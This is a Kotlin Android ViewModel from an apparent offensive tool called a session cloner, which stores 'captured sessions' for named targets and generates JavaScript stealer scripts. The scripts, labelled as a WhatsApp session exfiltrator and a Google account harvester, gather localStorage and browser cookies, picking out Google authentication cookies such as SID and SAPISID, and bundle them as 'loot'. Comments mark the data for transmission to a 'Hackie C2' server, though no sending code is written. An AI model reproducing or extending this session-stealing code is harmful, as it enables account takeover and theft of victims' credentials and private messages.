package com.example.rabit.ui.zero_touch

import androidx.lifecycle.ViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow

data class CapturedSession(
    val id: String,
    val target: String,
    val platform: String, // WhatsApp, Google, Facebook
    val token: String,
    val lastActive: Long,
    val status: String = "Active"
)

class SessionClonerViewModel : ViewModel() {
    private val _sessions = MutableStateFlow<List<CapturedSession>>(emptyList())
    val sessions = _sessions.asStateFlow()

    fun addSession(session: CapturedSession) {
        _sessions.value = listOf(session) + _sessions.value
    }

    fun generateStealerScript(platform: String): String {
        return when(platform) {
            "WhatsApp" -> """
                // TACTICAL WHATSAPP SESSION EXFILTRATOR
                (function() {
                    console.log("INTERCEPTING WA_SESSION...");
                    const waLoot = {
                        localStorage: JSON.stringify(localStorage),
                        indexedDB: "Extraction Pending (requires async bypass)",
                        timestamp: new Date().getTime(),
                        platform: "WhatsApp Web"
                    };
                    // Transmit to Hackie C2
                    return waLoot;
                })();
            """.trimIndent()
            "Google" -> """
                // TACTICAL GOOGLE ACCOUNT HARVESTER
                (function() {
                    console.log("HARVESTING GOOGLE_AUTH...");
                    const googleCookies = document.cookie.split(';').filter(c => 
                        c.includes('SID') || c.includes('HSID') || c.includes('SSID') || 
                        c.includes('SAPISID') || c.includes('APISID')
                    );
                    const loot = {
                        tokens: googleCookies.join(';'),
                        localStorage: JSON.stringify(localStorage),
                        timestamp: new Date().getTime(),
                        platform: "Google Accounts"
                    };
                    // Transmit to Hackie C2
                    return loot;
                })();
            """.trimIndent()
            else -> """
                // GENERAL SESSION STEALER
                (function() {
                    const loot = {
                        cookies: document.cookie,
                        localStorage: JSON.stringify(localStorage),
                        platform: "$platform",
                        timestamp: new Date().getTime()
                    };
                    return loot;
                })();
            """.trimIndent()
        }
    }
    
    fun generateDemoSessions() {
        addSession(CapturedSession("1", "Target Alpha", "WhatsApp", "wa_auth_token_8821...", System.currentTimeMillis() - 3600000))
        addSession(CapturedSession("2", "Target Beta", "Google", "sid_token_gh_991...", System.currentTimeMillis() - 7200000))
    }
}
